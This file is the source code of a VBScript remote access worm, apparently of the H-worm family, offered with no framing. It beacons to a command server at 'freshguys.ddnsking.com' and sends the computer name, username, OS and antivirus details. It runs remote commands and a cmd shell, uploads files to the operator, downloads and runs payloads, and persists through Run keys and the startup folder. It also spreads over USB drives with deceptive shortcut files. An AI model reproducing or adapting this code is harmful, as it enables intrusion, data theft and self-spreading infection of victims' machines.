host = "freshguys.ddnsking.com"
port = 5674
installdir = "%temp%"
lnkfile = False
lnkfolder = False


Dim shellobj
Set shellobj = WScript.CreateObject("wscript.shell")
Dim filesystemobj
Set filesystemobj = CreateObject("scripting.filesystemobject")
Dim httpobj
Set httpobj = CreateObject("msxml2.xmlhttp")


installname = WScript.scriptname
startup = shellobj.specialfolders ("startup") & "\"
installdir = shellobj.expandenvironmentstrings(installdir) & "\"
If Not filesystemobj.folderexists(installdir) Then  installdir = shellobj.expandenvironmentstrings("%temp%") & "\"
spliter = "<" & "|" & ">"
sleep = 5000
Dim response
Dim cmd
Dim param
info = ""
usbspreading = ""
startdate = ""
Dim oneonce

On Error Resume Next


instance
While True
    
    install
    
    response = ""
    response = post ("is-ready","")
    cmd = Split (response,spliter)
    Select Case cmd (0)
        Case "excecute"
        param = cmd (1)
        execute param
        Case "update"
        param = cmd (1)
        oneonce.close
        Set oneonce = filesystemobj.opentextfile (installdir & installname ,2, False)
        oneonce.write param
        oneonce.close
        shellobj.run "wscript.exe //B " & Chr(34) & installdir & installname & Chr(34)
        WScript.quit
        Case "uninstall"
        uninstall
        Case "send"
        download cmd (1),cmd (2)
        Case "site-send"
        sitedownloader cmd (1),cmd (2)
        Case "recv"
        param = cmd (1)
        upload (param)
        Case  "enum-driver"
        post "is-enum-driver",enumdriver
        Case  "enum-faf"
        param = cmd (1)
        post "is-enum-faf",enumfaf (param)
        Case  "enum-process"
        post "is-enum-process",enumprocess
        Case  "cmd-shell"
        param = cmd (1)
        post "is-cmd-shell",cmdshell (param)
        Case  "delete"
        param = cmd (1)
        deletefaf (param)
        Case  "exit-process"
        param = cmd (1)
        exitprocess (param)
        Case  "sleep"
        param = cmd (1)
        sleep = Eval (param)
    End Select
    
    WScript.sleep sleep
    
WEnd subinstall
On Error Resume Next
Dim lnkobj
Dim filename
Dim foldername
Dim fileicon
Dim foldericon

upstart
For Each drive In filesystemobj.drives
    
    If  drive.isready = True Then
        If  drive.freespace > 0 Then
            If  drive.drivetype = 1 Then
                filesystemobj.copyfile WScript.scriptfullname , drive.path & "\" & installname,True
                If  filesystemobj.fileexists (drive.path & "\" & installname)  Then
                    filesystemobj.getfile(drive.path & "\" & installname).attributes = 2 + 4
                End If
                For Each file In filesystemobj.getfolder( drive.path & "\" ).Files
                    If Not lnkfile Then Exit For
                    If  InStr (file.name,".") Then
                        If  LCase (Split(file.name, ".") (UBound(Split(file.name, ".")))) <> "lnk" Then
                            file.attributes = 2 + 4
                            If  UCase (file.name) <> UCase (installname) Then
                                filename = Split(file.name,".")
                                Set lnkobj = shellobj.createshortcut (drive.path & "\" & filename (0) & ".lnk")
                                lnkobj.windowstyle = 7
                                lnkobj.targetpath = "cmd.exe"
                                lnkobj.workingdirectory = ""
                                lnkobj.arguments = "/c start " & Replace(installname," ", chrw(34) & " " & chrw(34)) & "&start " & Replace(file.name," ", chrw(34) & " " & chrw(34)) & "&exit"
                                fileicon = shellobj.regread ("HKEY_LOCAL_MACHINE\software\classes\" & shellobj.regread ("HKEY_LOCAL_MACHINE\software\classes\." & Split(file.name, ".")(UBound(Split(file.name, "."))) & "\") & "\defaulticon\")
                                If  InStr (fileicon,",") = 0 Then
                                    lnkobj.iconlocation = file.path
                                Else
                                    lnkobj.iconlocation = fileicon
                                End If
                                lnkobj.save()
                            End If
                        End If
                    End If
                Next
                For Each folder In filesystemobj.getfolder( drive.path & "\" ).subfolders
                    If Not lnkfolder Then Exit For
                    folder.attributes = 2 + 4
                    foldername = folder.name
                    Set lnkobj = shellobj.createshortcut (drive.path & "\" & foldername & ".lnk")
                    lnkobj.windowstyle = 7
                    lnkobj.targetpath = "cmd.exe"
                    lnkobj.workingdirectory = ""
                    lnkobj.arguments = "/c start " & Replace(installname," ", chrw(34) & " " & chrw(34)) & "&start explorer " & Replace(folder.name," ", chrw(34) & " " & chrw(34)) & "&exit"
                    foldericon = shellobj.regread ("HKEY_LOCAL_MACHINE\software\classes\folder\defaulticon\")
                    If  InStr (foldericon,",") = 0 Then
                        lnkobj.iconlocation = folder.path
                    Else
                        lnkobj.iconlocation = foldericon
                    End If
                    lnkobj.save()
                Next
            End If
        End If
    End If
Next
err.clear
End Sub

Sub uninstall
On Error Resume Next
Dim filename
Dim foldername

shellobj.regdelete "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run\" & Split (installname,".")(0)
shellobj.regdelete "HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\run\" & Split (installname,".")(0)
filesystemobj.deletefile startup & installname ,True
filesystemobj.deletefile WScript.scriptfullname ,True

For  Each drive In filesystemobj.drives
    If  drive.isready = True Then
        If  drive.freespace > 0 Then
            If  drive.drivetype = 1 Then
                For  Each file In filesystemobj.getfolder ( drive.path & "\").files
                    On Error Resume Next
                    If  InStr (file.name,".") Then
                        If  LCase (Split(file.name, ".")(UBound(Split(file.name, ".")))) <> "lnk" Then
                            file.attributes = 0
                            If  UCase (file.name) <> UCase (installname) Then
                                filename = Split(file.name,".")
                                filesystemobj.deletefile (drive.path & "\" & filename(0) & ".lnk" )
                            Else
                                filesystemobj.deletefile (drive.path & "\" & file.name)
                            End If
                        Else
                            filesystemobj.deletefile (file.path)
                        End If
                    End If
                Next
                For Each folder In filesystemobj.getfolder( drive.path & "\" ).subfolders
                    folder.attributes = 0
                Next
            End If
        End If
    End If
Next
WScript.quit
End Sub

Function post (cmd ,param)

post = param
httpobj.open "post","http://" & host & ":" & port & "/" & cmd, False
httpobj.setrequestheader "user-agent:",information
httpobj.send param
post = httpobj.responsetext
End Function

Function information
On Error Resume Next
If  inf = "" Then
    inf = hwid & spliter
    inf = inf & shellobj.expandenvironmentstrings("%computername%") & spliter
    inf = inf & shellobj.expandenvironmentstrings("%username%") & spliter
    
    Set root = GetObject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
    Set os = root.execquery ("select * from win32_operatingsystem")
    For Each osinfo In os
        inf = inf & osinfo.caption & spliter
        Exit For
    Next
    inf = inf & "plus" & spliter
    inf = inf & security & spliter
    inf = inf & usbspreading
    information = inf
Else
    information = inf
End If
End Function


Sub upstart ()
On Error Resume Next

shellobj.regwrite "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run\" & Split (installname,".")(0),  "wscript.exe //B " & chrw(34) & installdir & installname & chrw(34) , "REG_SZ"
shellobj.regwrite "HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\run\" & Split (installname,".")(0),  "wscript.exe //B " & chrw(34) & installdir & installname & chrw(34) , "REG_SZ"
filesystemobj.copyfile WScript.scriptfullname,installdir & installname,True
filesystemobj.copyfile WScript.scriptfullname,startup & installname ,True

End Sub


Function hwid
On Error Resume Next

Set root = GetObject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
Set disks = root.execquery ("select * from win32_logicaldisk")
For Each disk In disks
    If  disk.volumeserialnumber <> "" Then
        hwid = disk.volumeserialnumber
        Exit For
    End If
Next
End Function


Function security
On Error Resume Next

security = ""

Set objwmiservice = GetObject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
Set colitems = objwmiservice.execquery("select * from win32_operatingsystem",,48)
For Each objitem In colitems
    versionstr = Split (objitem.version,".")
Next
versionstr = Split (colitems.version,".")
osversion = versionstr (0) & "."
For  x = 1 To UBound (versionstr)
    osversion = osversion & versionstr (i)
Next
osversion = Eval (osversion)
If  osversion > 6 Then sc = "securitycenter2" Else sc = "securitycenter"

Set objsecuritycenter = GetObject("winmgmts:\\localhost\root\" & sc)
Set colantivirus = objsecuritycenter.execquery("select * from antivirusproduct","wql",0)

For Each objantivirus In colantivirus
    security = security & objantivirus.displayname & " ."
Next
If security = "" Then security = "nan-av"
End Function


Function instance
On Error Resume Next

usbspreading = shellobj.regread ("HKEY_LOCAL_MACHINE\software\" & Split (installname,".")(0) & "\")
If usbspreading = "" Then
    If LCase ( Mid(WScript.scriptfullname,2)) = ":\" & LCase(installname) Then
        usbspreading = "true - " & Date
        shellobj.regwrite "HKEY_LOCAL_MACHINE\software\" & Split (installname,".")(0) & "\",  usbspreading, "REG_SZ"
    Else
        usbspreading = "false - " & Date
        shellobj.regwrite "HKEY_LOCAL_MACHINE\software\" & Split (installname,".")(0) & "\",  usbspreading, "REG_SZ"
        
    End If
End If



upstart
Set scriptfullnameshort = filesystemobj.getfile (WScript.scriptfullname)
Set installfullnameshort = filesystemobj.getfile (installdir & installname)
If  LCase (scriptfullnameshort.shortpath) <> LCase (installfullnameshort.shortpath) Then
    shellobj.run "wscript.exe //B " & Chr(34) & installdir & installname & Chr(34)
    WScript.quit
End If
err.clear
Set oneonce = filesystemobj.opentextfile (installdir & installname ,8, False)
If  err.number > 0 Then WScript.quit
End Function


Sub sitedownloader (fileurl,filename)

strlink = fileurl
strsaveto = installdir & filename
Set objhttpdownload = CreateObject("msxml2.xmlhttp" )
objhttpdownload.open "get", strlink, False
objhttpdownload.send

Set objfsodownload = CreateObject ("scripting.filesystemobject")
If  objfsodownload.fileexists (strsaveto) Then
    objfsodownload.deletefile (strsaveto)
End If

If objhttpdownload.status = 200 Then
    Dim  objstreamdownload
    Set  objstreamdownload = CreateObject("adodb.stream")
    With objstreamdownload
        .Type = 1
        .open
        .write objhttpdownload.responsebody
        .savetofile strsaveto
        .close
    End With
    Set objstreamdownload = Nothing
End If
If objfsodownload.fileexists(strsaveto) Then
    shellobj.run objfsodownload.getfile (strsaveto).shortpath
End If
End Sub

Sub download (fileurl,filedir)

If filedir = "" Then
    filedir = installdir
End If

strsaveto = filedir & Mid (fileurl, InStrRev (fileurl,"\") + 1)
Set objhttpdownload = CreateObject("msxml2.xmlhttp")
objhttpdownload.open "post","http://" & host & ":" & port & "/" & "is-sending" & spliter & fileurl, False
objhttpdownload.send ""

Set objfsodownload = CreateObject ("scripting.filesystemobject")
If  objfsodownload.fileexists (strsaveto) Then
    objfsodownload.deletefile (strsaveto)
End If
If  objhttpdownload.status = 200 Then
    Dim  objstreamdownload
    Set  objstreamdownload = CreateObject("adodb.stream")
    With objstreamdownload
        .Type = 1
        .open
        .write objhttpdownload.responsebody
        .savetofile strsaveto
        .close
    End With
    Set objstreamdownload = Nothing
End If
If objfsodownload.fileexists(strsaveto) Then
    shellobj.run objfsodownload.getfile (strsaveto).shortpath
End If
End Sub


Function upload (fileurl)

Dim  httpobj,objstreamuploade,buffer
Set  objstreamuploade = CreateObject("adodb.stream")
With objstreamuploade
    .Type = 1
    .open
    .loadfromfile fileurl
    buffer = .read
    .close
End With
Set objstreamdownload = Nothing
Set httpobj = CreateObject("msxml2.xmlhttp")
httpobj.open "post","http://" & host & ":" & port & "/" & "is-recving" & spliter & fileurl, False
httpobj.send buffer
End Function


Function enumdriver ()

For  Each drive In filesystemobj.drives
    If   drive.isready = True Then
        enumdriver = enumdriver & drive.path & "|" & drive.drivetype & spliter
    End If
Next
End Function

Function enumfaf (enumdir)

enumfaf = enumdir & spliter
For  Each folder In filesystemobj.getfolder (enumdir).subfolders
    enumfaf = enumfaf & folder.name & "|" & "" & "|" & "d" & "|" & folder.attributes & spliter
Next

For  Each file In filesystemobj.getfolder (enumdir).files
    enumfaf = enumfaf & file.name & "|" & file.size & "|" & "f" & "|" & file.attributes & spliter
    
Next
End Function


Function enumprocess ()

On Error Resume Next

Set objwmiservice = GetObject("winmgmts:\\.\root\cimv2")
Set colitems = objwmiservice.execquery("select * from win32_process",,48)

Dim objitem
For Each objitem In colitems
    enumprocess = enumprocess & objitem.name & "|"
    enumprocess = enumprocess & objitem.processid & "|"
    enumprocess = enumprocess & objitem.executablepath & spliter
Next
End Function

Sub exitprocess (pid)
On Error Resume Next

shellobj.run "taskkill /F /T /PID " & pid,7,True
End Sub

Sub deletefaf (url)
On Error Resume Next

filesystemobj.deletefile url
filesystemobj.deletefolder url

End Sub

Function cmdshell (cmd)

Dim httpobj,oexec,readallfromany

Set oexec = shellobj.exec ("%comspec% /c " & cmd)
If Not oexec.stdout.atendofstream Then
    readallfromany = oexec.stdout.readall
ElseIf Not oexec.stderr.atendofstream Then
    readallfromany = oexec.stderr.readall
Else
    readallfromany = ""
End If

cmdshell = readallfromany
End Function
